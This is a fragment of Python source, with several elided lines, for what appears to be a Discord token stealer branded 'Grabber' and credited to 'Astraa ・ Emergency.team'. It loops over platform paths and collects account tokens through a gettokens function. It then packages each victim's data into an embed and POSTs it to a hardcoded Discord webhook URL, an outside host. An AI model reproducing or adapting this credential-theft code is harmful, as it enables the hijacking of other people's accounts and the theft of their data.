    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                    ...
                    'embeds': [
                        {
                            ...
                            'color': 3092790,
                            'footer': {
                                'text': "Made by Astraa ・ Emergency.team"
                            },
                            'thumbnail': {
                                'url': f"https://cdn.discordapp.com/Emergency.team/{res_json['id']}/{res_json['avatar']}.png"
                            }
                        }
                    ],
                    "username": "Grabber",
                ...
                urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/webhooks/1403653865626140726/rUwfqGLdWOsaRcbi5loLmRV5PPJS28sMSd_5APvqFP4UywwRIXLG3VsKBCiN_0Rx7dAf', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
